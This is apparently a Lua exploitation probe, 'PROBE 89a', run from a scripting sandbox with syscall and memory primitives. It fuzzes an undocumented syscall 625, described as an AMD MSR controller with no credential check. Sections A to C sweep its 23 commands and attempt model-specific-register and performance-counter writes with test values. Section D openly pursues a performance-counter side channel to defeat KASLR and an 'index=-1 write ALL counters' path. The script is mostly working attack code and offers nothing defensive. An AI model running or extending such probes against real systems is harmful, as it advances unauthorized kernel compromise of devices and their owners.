-- CRASH_CLASS: MODERATE
-- PROBE 89a: sys 625 AMD MSR controller — 23 commands, NO credential check
--
-- Context: Deep handler analysis reveals sys 625 is a 23-command MSR read/write
-- interface with NO credential predicate in the handler body. This is DIFFERENT
-- from sys 626 (which returned -1 for all). Sys 625 takes 4 args:
--   arg0: command (1-23), arg1: domain (0-3), arg2: index (0-7), arg3: value (64-bit)
-- Commands include direct wrmsr to AMD PMC MSRs 0xc0010230-0xc001023b.
-- If accessible, this gives us hardware MSR writes — potentially PMC side channels
-- for KASLR defeat, or direct counter manipulation.
--
-- Section A: Reachability sweep — all 23 commands with safe zero args
-- Section B: Counter read via observation — enable PMCs, read counters
-- Section C: Direct MSR write test — write known values to counter MSRs
-- Section D: PMC KASLR side channel — count kernel instructions between syscalls

-- Configurable: set TEST_SECTION before sending
local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 89a: sys 625 MSR CONTROLLER ===")
print("Section: " .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

local sc625 = make_syscall(625)
local sc624 = make_syscall(624)

if TEST_SECTION == "A" then
    print("--- Section A: Reachability sweep all 23 commands ---")
    print("")

    -- First test: does sys 625 even return without killing us?
    print("[A1] Testing cmd=0 (below valid range, expect ret=22):")
    local ok, rv = pcall(function()
        return sc625(uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        print("  cmd=0: ret=" .. fmt(rv))
    else
        print("  cmd=0: PCALL-FAIL")
    end
    print("")

    -- Sweep commands 1-23 with all-zero domain/index/value (safest possible)
    print("[A2] Commands 1-23, domain=0, index=0, value=0:")
    local results = {}
    for cmd = 1, 23 do
        local ok2, rv2 = pcall(function()
            return sc625(uint64(cmd), uint64(0), uint64(0), uint64(0))
        end)
        local status
        if ok2 then
            status = fmt(rv2)
        else
            status = "PCALL-FAIL"
        end
        results[cmd] = status
        print(string.format("  cmd=%2d: %s", cmd, status))
    end
    print("")

    -- Test out-of-range command (24)
    print("[A3] cmd=24 (above valid range, expect ret=22):")
    ok, rv = pcall(function()
        return sc625(uint64(24), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        print("  cmd=24: ret=" .. fmt(rv))
    else
        print("  cmd=24: PCALL-FAIL")
    end
    print("")

    -- Count accessible commands
    local accessible = 0
    for cmd = 1, 23 do
        if results[cmd] and results[cmd] ~= "PCALL-FAIL" then
            local h, l = 0, 0
            if results[cmd]:find("0x") then
                -- parse return value
                if results[cmd] == "0x0" then
                    accessible = accessible + 1
                end
            end
        end
    end
    print("[A4] Commands returning 0 (success): " .. accessible .. " of 23")
    print("")

    -- Test domain sensitivity for commands that returned 0
    print("[A5] Domain sensitivity test for accessible commands:")
    for cmd = 1, 23 do
        if results[cmd] == "0x0" then
            for domain = 1, 3 do
                local ok3, rv3 = pcall(function()
                    return sc625(uint64(cmd), uint64(domain), uint64(0), uint64(0))
                end)
                if ok3 then
                    print(string.format("  cmd=%d domain=%d: ret=%s", cmd, domain, fmt(rv3)))
                else
                    print(string.format("  cmd=%d domain=%d: PCALL-FAIL", cmd, domain))
                end
            end
        end
    end
    print("")

    -- Test index sensitivity for commands that work with domain=0
    print("[A6] Index sensitivity for domain=0 commands:")
    for cmd = 1, 23 do
        if results[cmd] == "0x0" then
            for idx = 0, 7 do
                local ok4, rv4 = pcall(function()
                    return sc625(uint64(cmd), uint64(0), uint64(idx), uint64(0))
                end)
                if ok4 then
                    print(string.format("  cmd=%d idx=%d: ret=%s", cmd, idx, fmt(rv4)))
                else
                    print(string.format("  cmd=%d idx=%d: PCALL-FAIL", cmd, idx))
                end
            end
            break -- only first accessible command to limit output
        end
    end

    print("")
    print("[DONE] Section A complete")

elseif TEST_SECTION == "B" then
    print("--- Section B: PMC enable and counter observation ---")
    print("")

    -- The analysis shows one command sets bit 22 in PMC MSRs (enable counting)
    -- and another writes counter values. If we can enable PMCs, we can use
    -- sys 624 (confirmed VM op counter) as a baseline, then see if PMCs
    -- give us different counts.

    -- First: baseline sys 624 reading
    print("[B1] Baseline sys 624 (VM op counter):")
    for i = 1, 3 do
        local ok1, rv1 = pcall(function() return sc624() end)
        if ok1 then
            print("  read " .. i .. ": " .. fmt(rv1))
        else
            print("  read " .. i .. ": PCALL-FAIL")
        end
    end
    print("")

    -- Try each command that might be "enable PMC" (domain 1-3 variants)
    -- The analysis says the enable block sets bit 22 in six MSRs
    print("[B2] Attempting PMC enable commands with domain=1:")
    for cmd = 1, 23 do
        local ok2, rv2 = pcall(function()
            return sc625(uint64(cmd), uint64(1), uint64(0), uint64(0))
        end)
        if ok2 then
            local rval = fmt(rv2)
            if rval == "0x0" then
                print(string.format("  cmd=%d domain=1: SUCCESS (ret=0) *** ACCESSIBLE ***", cmd))
            else
                print(string.format("  cmd=%d domain=1: ret=%s", cmd, rval))
            end
        else
            print(string.format("  cmd=%d domain=1: PCALL-FAIL", cmd))
        end
    end
    print("")

    -- After potential enable, check sys 624 again
    print("[B3] Post-enable sys 624 readings:")
    for i = 1, 3 do
        local ok3, rv3 = pcall(function() return sc624() end)
        if ok3 then
            print("  read " .. i .. ": " .. fmt(rv3))
        else
            print("  read " .. i .. ": PCALL-FAIL")
        end
    end
    print("")

    -- Try counter write: cmd with domain=1, index=0, value=0x42424242
    print("[B4] Counter write attempt (various cmds, domain=1, idx=0, val=0x42424242):")
    for cmd = 1, 23 do
        local ok4, rv4 = pcall(function()
            return sc625(uint64(cmd), uint64(1), uint64(0), uint64(0x42424242))
        end)
        if ok4 then
            local rval = fmt(rv4)
            if rval == "0x0" then
                print(string.format("  cmd=%d: SUCCESS with value *** MSR WRITE? ***", cmd))
            else
                print(string.format("  cmd=%d: ret=%s", cmd, rval))
            end
        else
            print(string.format("  cmd=%d: PCALL-FAIL", cmd))
        end
    end

    print("")
    print("[DONE] Section B complete")

elseif TEST_SECTION == "C" then
    print("--- Section C: Direct MSR value write + readback ---")
    print("")

    -- If commands are accessible, try writing specific counter values
    -- and use timing differences to verify the write took effect.
    -- PMC MSR 0xc0010231 (counter 0 odd) accepts raw 64-bit writes.

    -- Try domain=0 counter writes (index -1 writes all counters)
    print("[C1] Domain=0 counter writes, sweep index 0-7:")
    for idx = 0, 7 do
        local ok1, rv1 = pcall(function()
            return sc625(uint64(1), uint64(0), uint64(idx), uint64(0))
        end)
        if ok1 then
            print(string.format("  cmd=1 dom=0 idx=%d val=0: ret=%s", idx, fmt(rv1)))
        else
            print(string.format("  cmd=1 dom=0 idx=%d: PCALL-FAIL", idx))
        end
    end
    print("")

    -- Try writing with different values to see if value matters
    print("[C2] Value sensitivity test (cmd=1, dom=0, idx=0):")
    local test_vals = {0, 1, 0xFF, 0xFFFF, 0x42424242}
    for _, val in ipairs(test_vals) do
        local ok2, rv2 = pcall(function()
            return sc625(uint64(1), uint64(0), uint64(0), uint64(val))
        end)
        if ok2 then
            print(string.format("  val=0x%X: ret=%s", val, fmt(rv2)))
        else
            print(string.format("  val=0x%X: PCALL-FAIL", val))
        end
    end
    print("")

    -- Try the helper path that writes raw64 to counter MSRs
    -- Analysis says: helper 0xffffffff8afc4c50 writes raw64 to 0xc0010241+2*index
    print("[C3] All commands with domain=0, idx=0, val=1 (find which cmd writes counters):")
    for cmd = 1, 23 do
        local ok3, rv3 = pcall(function()
            return sc625(uint64(cmd), uint64(0), uint64(0), uint64(1))
        end)
        if ok3 then
            print(string.format("  cmd=%2d: ret=%s", cmd, fmt(rv3)))
        else
            print(string.format("  cmd=%2d: PCALL-FAIL", cmd))
        end
    end
    print("")

    -- If any writes succeed, do a timing test:
    -- Write counter to 0, do some work, try to read counter
    print("[C4] Timing differential test:")
    local t1 = os.clock()
    -- Do some work: 1000 iterations of syscall
    local count_before = nil
    local ok_b, rv_b = pcall(function() return sc624() end)
    if ok_b then count_before = rv_b end

    for i = 1, 100 do
        pcall(function() sc624() end)
    end

    local count_after = nil
    local ok_a, rv_a = pcall(function() return sc624() end)
    if ok_a then count_after = rv_a end
    local t2 = os.clock()

    print("  624 before: " .. (count_before and fmt(count_before) or "nil"))
    print("  624 after:  " .. (count_after and fmt(count_after) or "nil"))
    print("  wall time:  " .. string.format("%.6f", t2 - t1) .. "s")

    print("")
    print("[DONE] Section C complete")

elseif TEST_SECTION == "D" then
    print("--- Section D: PMC KASLR side channel attempt ---")
    print("")

    -- If PMCs are writable, we can potentially:
    -- 1. Configure a PMC to count retired instructions
    -- 2. Write counter = 0
    -- 3. Call a syscall
    -- 4. Read counter = number of kernel instructions executed
    -- 5. Map the instruction count to identify code paths → KASLR slide

    -- This requires:
    -- a) An "enable" command that sets bit 22 (PMC enable) in event select MSRs
    -- b) A "configure" command that sets event select to count retired instructions
    -- c) A "write counter" command to zero the counter
    -- d) A "read counter" command — but we may not have one!

    -- Alternative: use sys 624 counter + PMC writes to create a timing oracle

    -- First: enumerate what we can actually do
    print("[D1] Full command matrix (cmd x domain):")
    for cmd = 1, 23 do
        local line = string.format("  cmd=%2d:", cmd)
        for dom = 0, 3 do
            local ok1, rv1 = pcall(function()
                return sc625(uint64(cmd), uint64(dom), uint64(0), uint64(0))
            end)
            if ok1 then
                line = line .. string.format(" d%d=%s", dom, fmt(rv1))
            else
                line = line .. string.format(" d%d=FAIL", dom)
            end
        end
        print(line)
    end
    print("")

    -- Try the analysis's "tail-call 0xffffffff8b33fe00" path (cmd with dom/idx/val=0)
    -- This might be an initialization/query that returns useful data
    print("[D2] Testing initialization path (all-zero args except cmd):")
    for cmd = 1, 5 do
        local ok2, rv2 = pcall(function()
            return sc625(uint64(cmd), uint64(0), uint64(0), uint64(0))
        end)
        if ok2 then
            local h, l = get_hi_lo(rv2)
            print(string.format("  cmd=%d: ret=0x%X%08X (h=%d l=%d)", cmd, h, l, h, l))
        else
            print(string.format("  cmd=%d: PCALL-FAIL", cmd))
        end
    end
    print("")

    -- If we found an accessible command, try signed index=-1 (writes ALL counters)
    -- This is the most powerful path in the handler
    print("[D3] Index=-1 test (write ALL counters, domain=1):")
    -- In Lua, -1 as uint64 is 0xFFFFFFFFFFFFFFFF, but handler reads signed int32
    -- So we need to pass 0xFFFFFFFF in the index slot
    local idx_neg1 = uint64(0xFFFFFFFF)
    for cmd = 1, 10 do
        local ok3, rv3 = pcall(function()
            return sc625(uint64(cmd), uint64(1), idx_neg1, uint64(0))
        end)
        if ok3 then
            print(string.format("  cmd=%d idx=-1 dom=1: ret=%s", cmd, fmt(rv3)))
        else
            print(string.format("  cmd=%d idx=-1 dom=1: PCALL-FAIL", cmd))
        end
    end

    print("")
    print("[DONE] Section D complete")
end

print("")
print("=== PROBE 89a COMPLETE ===")
